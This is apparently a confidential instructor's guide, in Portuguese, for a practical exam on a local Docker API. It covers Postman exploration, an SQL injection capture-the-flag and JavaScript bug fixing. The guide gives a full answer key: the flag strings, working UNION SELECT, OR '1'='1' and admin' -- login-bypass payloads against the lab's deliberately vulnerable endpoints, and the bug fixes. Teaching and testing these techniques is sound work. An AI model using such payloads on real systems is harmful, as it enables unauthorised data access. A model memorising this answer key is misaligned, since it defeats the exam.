# 📋 Guia do Instrutor

> Documento confidencial para instrutores da prova prática

---

## 🎯 Objetivos de Aprendizado

### Parte 1: Exploração com Postman
- Familiarização com APIs REST
- Entendimento de métodos HTTP (GET, POST, PUT, DELETE, PATCH)
- Uso de query params e body
- Interpretação de respostas JSON

### Parte 2: CTF - SQL Injection
- Compreensão de vulnerabilidades de segurança
- Importância de prepared statements
- Técnicas básicas de SQL Injection
- Conscientização sobre segurança

### Parte 3: Correção de Bugs
- Leitura e compreensão de código
- Debugging básico
- Conceitos de JavaScript: tipos, async/await, escopo
- Boas práticas de programação

---

## ⏱️ Sugestão de Tempo

| Parte | Duração Sugerida |
|-------|------------------|
| Parte 1: Exploração | 30-45 minutos |
| Parte 2: CTF | 45-60 minutos |
| Parte 3: Bugs | 45-60 minutos |
| **Total** | **2-3 horas** |

---

## 🔧 Preparação do Ambiente

### Antes da Prova

1. **Teste o ambiente**
```bash
docker-compose up --build
# Aguarde ~30 segundos
curl http://localhost:3000
```

2. **Verifique se todos os endpoints funcionam**
```bash
# Produtos
curl http://localhost:3000/api/products

# Vulnerável
curl "http://localhost:3000/api/vulnerable/search?q=café"

# Buggy
curl http://localhost:3000/api/buggy
```

3. **Prepare as estações dos candidatos**
   - Docker instalado e funcionando
   - Postman instalado
   - Editor de código (VS Code recomendado)
   - Terminal disponível

### Durante a Prova

1. **Monitore os logs do container**
```bash
docker-compose logs -f api
```

2. **Observe as queries SQL Injection**
```bash
# As queries vulneráveis são logadas com [VULNERABLE]
```

### Após a Prova

1. **Reset do banco** (entre candidatos se necessário)
```bash
docker-compose down -v
docker-compose up --build
```

---

## 📊 Critérios de Avaliação

### Parte 1: Exploração (0-25 pontos)

| Critério | Pontos |
|----------|--------|
| Conseguiu fazer requisições GET | 5 |
| Conseguiu fazer requisições POST | 5 |
| Usou query params corretamente | 5 |
| Interpretou respostas de erro | 5 |
| Documentou os testes realizados | 5 |

### Parte 2: CTF (0-185 pontos)

| Flag | Pontos | Técnica Necessária |
|------|--------|-------------------|
| Flag 1 | 10 | UNION SELECT básico |
| Flag 2 | 25 | SQL Injection em filtro |
| Flag 3 | 50 | UNION SELECT avançado |
| Flag 4 | 100 | Bypass de autenticação |

### Parte 3: Bugs (0-60 pontos)

| Bug | Pontos | Conceito |
|-----|--------|----------|
| #1 Comparação | 10 | Tipos em JS |
| #2 Cálculo | 10 | Coerção de tipos |
| #3 Async | 10 | Promises/async |
| #4 Off-by-One | 10 | Loops e arrays |
| #5 Validação | 10 | Input validation |
| #6 Escopo | 10 | var vs let/const |

### Pontuação Total: 270 pontos

---

## ✅ Gabarito Completo

### CTF - Soluções Detalhadas

#### Flag 1 (10 pts) - `Flag{W3lc0m3_t0_SQL_W0rld}`

**Endpoint:** GET `/api/vulnerable/search`

**Payload:**
```
?q=' UNION SELECT flag_code,flag_name,hint,points,5,6,7,8,9 FROM secret_flags --
```

**Explicação:**
1. A aspas simples `'` fecha o LIKE
2. UNION combina resultados de outra tabela
3. Precisa ter o mesmo número de colunas (9)
4. `--` comenta o resto da query

---

#### Flag 2 (25 pts) - `Flag{SQL_1nj3ct10n_M4st3r}`

**Endpoint:** GET `/api/vulnerable/users`

**Payload:**
```
?role=' OR '1'='1
```

**Explicação:**
1. O OR '1'='1' sempre é verdadeiro
2. Retorna TODOS os usuários incluindo inativos
3. O usuário `suporte_tech` tem a flag na senha
4. A flag aparece na resposta JSON

---

#### Flag 3 (50 pts) - `Flag{Un10n_S3l3ct_Pr0}`

**Endpoint:** GET `/api/vulnerable/product/:id`

**Payload:**
```
/api/vulnerable/product/0 UNION SELECT 1,flag_code,flag_name,hint,points,6,7,8,9,10,11,12 FROM secret_flags WHERE flag_name='Avançado'
```

**Explicação:**
1. ID 0 não existe, retorna vazio
2. UNION adiciona os resultados da secret_flags
3. Precisa de 12 colunas (conta do SELECT original)
4. As flags aparecem nos campos name, description, etc.

---

#### Flag 4 (100 pts) - `Flag{4dm1n_P4ssw0rd_L34k3d}`

**Endpoint:** POST `/api/vulnerable/login`

**Payload:**
```json
{
    "username": "admin' --",
    "password": "qualquer_coisa"
}
```

**Ou alternativa:**
```json
{
    "username": "' OR '1'='1' --",
    "password": ""
}
```

**Explicação:**
1. `admin' --` fecha a aspas do username e comenta o resto
2. A query fica: `WHERE username = 'admin' --' AND password = '...'`
3. A verificação de senha é ignorada
4. Como logou como admin, a flag é retornada

---

### Bugs - Soluções Detalhadas

#### Bug #1 - Comparação de Tipos

**Arquivo:** `src/routes/buggy.js` linha ~35

**Problema:**
```javascript
const inStock = product.stock == '0' ? false : true;
```

**Solução:**
```javascript
const inStock = product.stock > 0;
// ou
const inStock = product.stock !== 0;
```

**Explicação:**
- `stock` é número, `'0'` é string
- `10 == '0'` é `false` (correto por acaso)
- `0 == '0'` é `true` (coerção), mas o ternário inverteria
- Melhor usar comparação numérica direta

---

#### Bug #2 - Cálculo Incorreto

**Arquivo:** `src/routes/buggy.js` linha ~65

**Problema:**
```javascript
let total = '0'; // String!
total += subtotal; // Concatenação!
```

**Solução:**
```javascript
let total = 0; // Número
total += subtotal; // Soma correta
```

**Explicação:**
- `'0' + 15.00 = '015'` (concatenação)
- `'015' + 12.00 = '01512'`
- Resultado final: string `'0151210...'`

---

#### Bug #3 - Async/Await

**Arquivo:** `src/routes/buggy.js` linha ~95

**Problema:**
```javascript
items.forEach(async (item) => {
    // async dentro de forEach não espera!
});
// Código continua ANTES do forEach terminar
```

**Solução:**
```javascript
for (const item of items) {
    const [product] = await query(...);
    // ... resto do código
}
// Agora espera cada item
```

**Ou usando Promise.all:**
```javascript
await Promise.all(items.map(async (item) => {
    // ... código async
}));
```

**Explicação:**
- `forEach` não retorna Promise
- O código após forEach executa imediatamente
- `for...of` com await espera cada iteração
- `Promise.all` executa em paralelo e espera todas

---

#### Bug #4 - Off-by-One Error

**Arquivo:** `src/routes/buggy.js` linha ~140

**Problema:**
```javascript
for (let i = 1; i <= products.length; i++) {
    ranking.push({ product: products[i] });
}
// products[products.length] é undefined!
```

**Solução:**
```javascript
for (let i = 0; i < products.length; i++) {
    ranking.push({
        position: i + 1,
        product: products[i]
    });
}
```

**Explicação:**
- Arrays são 0-indexed
- `products.length` é 5, mas índices vão de 0 a 4
- `products[5]` é `undefined`
- Se queria pular o primeiro, seria `i = 1; i < length`

---

#### Bug #5 - Validação de Entrada

**Arquivo:** `src/routes/buggy.js` linha ~175

**Problema:**
```javascript
// Sem validação!
const discountedPrice = product.price * (1 - discount_percent / 100);
```

**Solução:**
```javascript
// Adicionar validação
if (typeof discount_percent !== 'number' || 
    discount_percent < 0 || 
    discount_percent > 100) {
    return res.status(400).json({
        success: false,
        error: 'Desconto deve ser um número entre 0 e 100'
    });
}

const discountedPrice = product.price * (1 - discount_percent / 100);
```

**Explicação:**
- `-50%` resulta em `price * 1.5` (aumento!)
- `150%` resulta em `price * -0.5` (preço negativo!)
- `"abc"` resulta em `NaN`
- Sempre validar entrada do usuário

---

#### Bug #6 - Escopo de Variável

**Arquivo:** `src/routes/buggy.js` linha ~210

**Problema:**
```javascript
var categoryTotal = 0; // Fora do loop, escopo de função

for (const category of categories) {
    // ...
    categoryTotal += parseFloat(result.total); // Acumula!
    summary.push({ total_sales: categoryTotal });
}
```

**Solução:**
```javascript
for (const category of categories) {
    // ...
    const categoryTotal = parseFloat(result.total); // Dentro do loop
    summary.push({ total_sales: categoryTotal });
}
```

**Explicação:**
- `var` tem escopo de função, não de bloco
- A variável acumula entre iterações
- `let` ou `const` dentro do loop resolve
- Cada categoria deve ter seu próprio total

---

## 💡 Dicas para Condução

### Para Iniciantes em SQL Injection

Se o candidato está travado no CTF:

1. **Dica nível 1:** "Tente colocar uma aspas simples no campo"
2. **Dica nível 2:** "O erro SQL te mostra a estrutura da query"
3. **Dica nível 3:** "Pesquise sobre SQL Injection UNION SELECT"

### Para Dificuldade com Bugs

1. **Dica geral:** "Execute a rota e observe o resultado incorreto"
2. **Dica específica:** "Compare o tipo esperado com o tipo real"
3. **Dica avançada:** "Use console.log para debug"

---

## 📝 Template de Avaliação

```
Candidato: _______________
Data: _______________

PARTE 1 - EXPLORAÇÃO
[ ] GET básico (5 pts)
[ ] POST (5 pts)  
[ ] Query params (5 pts)
[ ] Erros (5 pts)
[ ] Documentação (5 pts)
Subtotal: ___ / 25

PARTE 2 - CTF
[ ] Flag 1 (10 pts)
[ ] Flag 2 (25 pts)
[ ] Flag 3 (50 pts)
[ ] Flag 4 (100 pts)
Subtotal: ___ / 185

PARTE 3 - BUGS
[ ] Bug 1 (10 pts)
[ ] Bug 2 (10 pts)
[ ] Bug 3 (10 pts)
[ ] Bug 4 (10 pts)
[ ] Bug 5 (10 pts)
[ ] Bug 6 (10 pts)
Subtotal: ___ / 60

TOTAL: ___ / 270

Observações:
_______________________
_______________________
```

---

## 🆘 Troubleshooting

### Container não inicia
```bash
docker-compose down -v
docker system prune -f
docker-compose up --build
```

### MySQL não conecta
- Aguarde mais tempo (pode demorar 30-60s)
- Verifique logs: `docker-compose logs mysql`

### Hot reload não funciona
- Verifique se o volume está mapeado
- Reinicie o container: `docker-compose restart api`

### Porta 3000 em uso
```bash
lsof -i :3000
kill -9 <PID>
```

---

*Documento confidencial - Não compartilhar com candidatos*
